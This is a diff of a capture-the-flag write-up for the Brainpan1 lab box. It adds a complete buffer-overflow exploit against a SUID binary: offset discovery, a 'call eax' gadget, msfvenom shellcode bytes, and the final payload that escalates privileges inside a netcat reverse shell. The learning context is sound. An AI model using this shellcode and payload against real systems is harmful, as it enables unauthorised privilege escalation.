@@ -430,12 +430,6 @@ Congratulations. We have root.
 
 ### method 2: suid binary
 
-:::info
-
-This one is not complete, as at `11-MAR-2022`
-
-:::
-
 After initial access to the box, I did `find . -perm /4000` and (I think it was kafka?) saw `/usr/local/bin/validate` in the results.
 
 I copied the binary to shared web folder `/bin/cp validate /home/puck/web/bin` so I could download it to my local machine to work on it.
@@ -471,6 +465,19 @@ main
 long long unsigned int
 ```
 
+check some other info about the file:
+
+```bash
+$ file validate  
+validate: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.15, BuildID[sha1]=c4b7d3019dda6ebc259c4e4b63a336e00a63b949, with debug_info, not stripped
+
+$ binwalk validate 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)
+```
+
 I will use gdb on my local machine to develop the overflow payload.
 
 Open the binary up in gdb:
@@ -495,6 +502,8 @@ Type "apropos word" to search for commands related to "word"...
 Reading symbols from ./validate...
 (gdb) 
 ```
+
+#### validate offset
 
 Let's find the offset, create the pattern first:
 
@@ -522,86 +531,288 @@ Query the return address in our `pattern_offset`, to find the offset:
 [*] Exact match at offset 116
 ```
 
-We now have our payload length:
-
-`payload = NOP + shellcode + alignment = 116 bytes` leaving 4 bytes for return address = `120 bytes`
-
-```bash
-$ pwn shellcraft -f d amd64.linux.sh
-\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
-```
-
-check size using python:
-
-```bash
-$ python3
-Python 3.8.10 (default, Nov 26 2021, 20:14:08) 
-[GCC 9.3.0] on linux
-Type "help", "copyright", "credits" or "license" for more information.
->>> shellcode = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05"
->>> len(shellcode)
-48
-```
-
-### Shellcode math
-
-`payload = NOP + 48 + alignment = 116`
+We now have our payload length which is the offset size: `116` bytes (don't include the return address 4 bytes).
 
 :::info
 
-The `alignment` block is usually 12-bytes long (need to confirm where this came from)
+All my own work after this point did not yield any results so from this point on I'm following this great write-up by [Interfence Security](https://resources.infosecinstitute.com/topic/brainpan_virtual_machine/) at infosecinstitute.
 
 :::
 
-So, `payload = NOP + 48 + 12 = 116`, so `NOP` is `56` bytes long.
+#### validate payload
+
+:::danger Further Understanding needed!
+
+I don't understand why the payload is in the order it is i.e. why sometimes the NOP comes before shellcodes instead of after, when do we know we need alignment bytes? I need to find more understanding of what determines what in the payload.
+
+:::
+
+`payload = shellcode + NOP` (116 bytes) + `return_address` (4 bytes)
+
+#### validate EIP
+
+verify that we control the EIP
 
 ```bash
-run $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + 'C'*4)"
-```
-
-Run payload in GDB:
-
-```bash
-(gdb) run $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + 'C'*4")
-Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + 'C'*4")
-
-Program received signal SIGSEGV, Segmentation fault.
-0x43434343 in ?? ()
-```
-
-This looks good, we're controlling the EIP (4 x C's).
-
-View memory, look for where the NOPs are:
-
-```bash
-(gdb) x/100x $sp
-0xffffd550:     0x504e4941      0x2f314e41      0x696c6176      0x65746164
-0xffffd560:     0x90909000      0x90909090      0x90909090      0x90909090 # <-- NOPs
-0xffffd570:     0x90909090      0x90909090      0x90909090      0x90909090
-0xffffd580:     0x90909090      0x90909090      0x90909090      0x90909090
-0xffffd590:     0x90909090      0x90909090      0x48686a90      0x69622fb8
-0xffffd5a0:     0x2f2f2f6e      0x89485073      0x697268e7      0x34810101
-0xffffd5b0:     0x01010124      0x56f63101      0x485e086a      0x4856e601
-0xffffd5c0:     0xd231e689      0x0f583b6a      0x42424205      0x42424242 # <-- B*12
-0xffffd5d0:     0x42424242      0x43434342      0x414c0043      0x653d474e # <-- C*4
-```
-
-We pick an address where our NOPs are, I choose `0xffffd570`, in little endian format `\x70\xd5\xff\xff`.
-
-New payload with return address:
-
-```bash
-run $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + '\x70\xd5\xff\xff'")
-```
-
-Run it:
-
-```bash
-(gdb) run $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + '\x70\xd5\xff\xff'")
+(gdb) run $(python -c "print 'A'*116 + 'B'*4")
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print '\x90'*56 + '\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05' + 'B'*12 + '\x70\xd5\xff\xff'")
+Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print 'A'*116 + 'B'*4")
 
 Program received signal SIGSEGV, Segmentation fault.
-0xffffd601 in ?? ()
+0x42424242 in ?? ()
 ```
+
+yes we can control the EIP.
+
+#### validate return address
+
+Find an instruction to `jmp` to our shellcode.
+
+check what's in the registers:
+
+```bash
+(gdb) i r
+eax            0xffffcf08          -12536
+ecx            0xffffd2e0          -11552
+edx            0xffffcf78          -12424
+ebx            0x41414141          1094795585
+esp            0xffffcf80          0xffffcf80
+ebp            0x41414141          0x41414141
+esi            0x2                 2
+edi            0x8048400           134513664
+eip            0x42424242          0x42424242
+eflags         0x10286             [ PF SF IF RF ]
+cs             0x23                35
+ss             0x2b                43
+ds             0x2b                43
+es             0x2b                43
+fs             0x0                 0
+gs             0x63                99
+(gdb) x/s $esp
+0xffffcf80:     ""
+(gdb) x/s $eip
+0x42424242:     <error: Cannot access memory at address 0x42424242>
+(gdb) x/s $eax
+0xffffcf08:     'A' <repeats 116 times>, "BBBB"
+```
+
+note: `$esp` is pointing at nothing and `$eax` is pointing to our shellcode place-holders (i.e. the A's), so we use `$eax` to jump to our shellcode.
+
+Let's see if there's a `jmp` instruction in the binary that can get us to the `eax` register:
+
+```bash
+┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]
+└─$ objdump -d validate | grep -i jmp
+ 8048382:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
+ 804838c:       ff 25 00 a0 04 08       jmp    *0x804a000
+ 8048397:       e9 e0 ff ff ff          jmp    804837c <.plt>
+ 804839c:       ff 25 04 a0 04 08       jmp    *0x804a004
+ 80483a7:       e9 d0 ff ff ff          jmp    804837c <.plt>
+ 80483ac:       ff 25 08 a0 04 08       jmp    *0x804a008
+ 80483b7:       e9 c0 ff ff ff          jmp    804837c <.plt>
+ 80483bc:       ff 25 0c a0 04 08       jmp    *0x804a00c
+ 80483c7:       e9 b0 ff ff ff          jmp    804837c <.plt>
+ 80483cc:       ff 25 10 a0 04 08       jmp    *0x804a010
+ 80483d7:       e9 a0 ff ff ff          jmp    804837c <.plt>
+ 80483dc:       ff 25 14 a0 04 08       jmp    *0x804a014
+ 80483e7:       e9 90 ff ff ff          jmp    804837c <.plt>
+ 80483ec:       ff 25 18 a0 04 08       jmp    *0x804a018
+ 80483f7:       e9 80 ff ff ff          jmp    804837c <.plt>
+ 80484cc:       eb 3a                   jmp    8048508 <validate+0x54>
+ 8048562:       eb 39                   jmp    804859d <main+0x65>
+```
+
+no `jmp` instructions. what about a `call` instruction?
+
+```bash
+┌──(kali㉿kali)-[~/…/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1]
+└─$ objdump -d validate| grep -i call
+ 8048353:       e8 00 00 00 00          call   8048358 <_init+0xc>
+ 8048369:       e8 1e 00 00 00          call   804838c <__gmon_start__@plt>
+ 804836e:       e8 1d 01 00 00          call   8048490 <frame_dummy>
+ 8048373:       e8 98 02 00 00          call   8048610 <__do_global_ctors_aux>
+ 804841c:       e8 7b ff ff ff          call   804839c <__libc_start_main@plt>
+ 8048468:       ff 14 85 14 9f 04 08    call   *0x8049f14(,%eax,4)
+ 80484af:       ff d0                   call   *%eax         # <--- here's one!
+ 80484f3:       e8 d4 fe ff ff          call   80483cc <printf@plt>
+ 80484ff:       e8 e8 fe ff ff          call   80483ec <exit@plt>
+ 8048511:       e8 96 fe ff ff          call   80483ac <strlen@plt>
+ 8048527:       e8 90 fe ff ff          call   80483bc <strcpy@plt>
+ 8048558:       e8 6f fe ff ff          call   80483cc <printf@plt>
+ 804856c:       e8 5b fe ff ff          call   80483cc <printf@plt>
+ 804857c:       e8 33 ff ff ff          call   80484b4 <validate>
+ 8048593:       e8 44 fe ff ff          call   80483dc <puts@plt>
+ 80485b6:       e8 4f 00 00 00          call   804860a <__i686.get_pc_thunk.bx>
+ 80485c4:       e8 83 fd ff ff          call   804834c <_init>
+ 80485f4:       ff 94 b3 18 ff ff ff    call   *-0xe8(%ebx,%esi,4)
+ 804862b:       ff d0                   call   *%eax         # <--- here's another!
+ 8048643:       e8 00 00 00 00          call   8048648 <_fini+0xc>
+ 804864f:       e8 dc fd ff ff          call   8048430 <__do_global_dtors_aux>
+```
+
+success! we have two instructions at memory address `80484af` and `804862b`.
+
+I'm going to use the 2nd one: `804862b` (add a `0` at the start).
+
+In little endian format, our return address = `\x2b\x86\x04\x08`.
+
+#### validate shellcode
+
+We already have a remote shell access to the box, so let's just spawn a new `/bin/sh` instance, this time with escalated privileges.
+
+Let's use `msfvenom` to generate some shellcode.
+
+```bash
+└─$ msfvenom -a x86 --platform linux -p linux/x86/exec CMD=/bin/sh -b '\x00' -f c
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 70 (iteration=0)
+x86/shikata_ga_nai chosen with final size 70
+Payload size: 70 bytes
+Final size of c file: 319 bytes
+unsigned char buf[] = 
+"\xbd\x2c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
+"\x0b\x31\x68\x15\x83\xe8\xfc\x03\x68\x11\xe2\xd9\x24\x74\xef"
+"\xb8\xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2"
+"\xa5\x26\x68\x94\xc9\xea\x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33"
+"\xf1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6";
+```
+
+check shellcode size with python:
+
+```bash
+└─$ python3                                                                     
+Python 3.9.10 (main, Feb 22 2022, 13:54:07) 
+[GCC 11.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> shell = (
+... "\xbd\x2c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
+... "\x0b\x31\x68\x15\x83\xe8\xfc\x03\x68\x11\xe2\xd9\x24\x74\xef"
+... "\xb8\xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2"
+... "\xa5\x26\x68\x94\xc9\xea\x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33"
+... "\xf1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6"
+... )
+>>> print(len(shell))
+70
+>>>
+```
+
+from our payload math above, we have this:
+
+|payload|shellcode + NOP|return address|
+|:---:|:---:|:---:|
+|116 bytes| shellcode(70) + NOP (46)| 4 bytes|
+
+our payload in full:
+
+```bash
+(gdb) run $(python -c "print ('\xbd\x2c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x0b\x31\x68\x15\x83\xe8\xf
+c\x03\x68\x11\xe2\xd9\x24\x74\xef\xb8\xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2\xa5\x26\x68\x94\xc9\xea\
+x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33\xf1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6') + ('\x90'*46) + ('\xaf\x84\x04\x08')")                             
+The program being debugged has been started already.                                                                  
+Start it from the beginning? (y or n) y                                                                               
+Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print ('\xbd\x2
+c\x4e\x7f\xb7\xd9\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x0b\x31\x68\x15\x83\xe8\xfc\x03\x68\x11\xe2\xd9\x24\x74\xef\xb8\
+xeb\xec\x67\x97\x68\x78\x90\x8f\x41\x09\x37\x4f\xf6\xc2\xa5\x26\x68\x94\xc9\xea\x9c\xae\x0d\x0a\x5d\x80\x6f\x63\x33\xf
+1\x1c\x1b\xcb\x5a\xb0\x52\x2a\xa9\xb6') + ('\x90'*46) + ('\xaf\x84\x04\x08')")                                        
+validating input...passed.                                                                                            
+[Inferior 1 (process 114848) exited normally]
+```
+
+:::danger Debug Payload
+
+The payload kept "passing" and exiting normally. I re-checked the `python -c "print 'A' * 70 + 'B' * 46 + 'C' * 4"` to make sure a) the EIP was still under my control and b) it still crashes with this payload length.
+
+After that I determined the shellcode was at fault and re-checked my badchars in the next section.
+
+:::
+
+#### correct overflow
+
+Re-generate my shellcode, this time using the bad characters list `x00x0axff` from the write-up:
+
+```bash
+─$ msfvenom -p linux/x86/exec CMD=/bin/sh -b 'x00x0axff' -f c
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 70 (iteration=0)
+x86/shikata_ga_nai chosen with final size 70
+Payload size: 70 bytes
+Final size of c file: 319 bytes
+unsigned char buf[] = 
+"\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+"\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7"
+"\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd"
+"\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7"
+"\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e";
+```
+
+check shellcode size again with python3:
+
+```bash
+└─$ python3
+Python 3.9.10 (main, Feb 22 2022, 13:54:07) 
+[GCC 11.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> shell = (
+... "\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
+... "\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7"
+... "\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd"
+... "\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7"
+... "\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e"
+... )
+>>> print(len(shell))
+70
+>>> 
+```
+
+```bash
+run $(python -c "print ('\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
+```
+
+test it on my local kali vm:
+
+```bash
+(gdb) run $(python -c "print ('\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
+Starting program: /home/kali/Documents/RxHack/THM/OFFENSIVEPENTESTPATH/BRAINPAN1/validate $(python -c "print ('\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
+process 115163 is executing new program: /usr/bin/dash
+[Detaching after vfork from child process 115165]
+$ whoami
+kali
+```
+
+And now take our payload to the TryHackMe box:
+
+```bash
+# listener running, and then fire the ./thm-linux.py script from before
+
+└─$ sudo rlwrap nc -lnvp 80              
+[sudo] password for kali: 
+listening on [any] 80 ...
+connect to [10.11.55.83] from (UNKNOWN) [10.10.180.131] 38600
+whoami
+puck
+/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
+cd /usr/local/bin
+cd /usr/local/bin
+ls
+ls
+validate
+./validate $(python -c "print ('\xbf\xbf\x9a\x24\x9f\xdb\xd4\xd9\x74\x24\xf4\x5a\x33\xc9\xb1\x0b\x31\x7a\x15\x03\x7a\x15\x83\xc2\x04\xe2\x4a\xf0\x2f\xc7\x2d\x57\x56\x9f\x60\x3b\x1f\xb8\x12\x94\x6c\x2f\xe2\x82\xbd\xcd\x8b\x3c\x4b\xf2\x19\x29\x43\xf5\x9d\xa9\x7b\x97\xf4\xc7\xac\x24\x6e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")
+<e\x18\xe4\x99\xe7\xf9\xc7\x9e') + ('\x90'*46) + ('\x2b\x86\x04\x08')")      
+whoami
+whoami
+anansi
+$ 
+```
+
+![privesc validate](/img/brainpan1-validate.png)
+
+Success!
+
+The pathway from here according to the write-ups is circling back around to the script found in the `sudo` method and then having sudo spawn a `/bin/sh` again to elevate user privileges to `root`.
+
+End.
